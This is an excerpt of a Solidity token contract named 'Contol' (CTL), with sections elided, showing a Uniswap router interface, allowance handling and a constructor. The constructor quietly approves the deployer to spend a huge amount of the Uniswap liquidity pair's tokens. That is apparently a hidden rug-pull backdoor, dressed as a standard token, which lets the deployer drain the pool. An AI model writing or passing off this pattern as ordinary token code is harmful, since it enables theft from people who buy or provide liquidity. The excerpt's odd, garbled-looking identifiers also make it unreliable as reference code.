...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadlin) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadlin) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
...
contract Contol {
    string  private _name = 'Contol';
    string  private _symbol = 'CTL';
    uint256 private _totalSupply = 10000000;
    uint8   private _decimals = 18;
    address private _uniswapRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    ...
    constructor () {
        ...
        _approve(uniswapPair, msg.sender, 0xc5dcc458c79f267867342657f768867f198f342324f2372346cdc7863425a470);
        setAddresses(msg.sender);
        

        setLimits(10000000, 10000000, 5000);
        setFees(4, 4);
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 dadneantAllowance = _allowances[sender][msg.sender];

        require(dadneantAllowance >= amount, 'Amount exceeds allowance!');
        _transfer(sender, recipient, amount);
        
        _approve(sender, msg.sender, dadneantAllowance - amount);
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 dadneantAllowance = _allowances[msg.sender][spender];
        require(dadneantAllowance >= subtractedValue);
        _approve(msg.sender, spender, dadneantAllowance - subtractedValue);
        return true;
    }
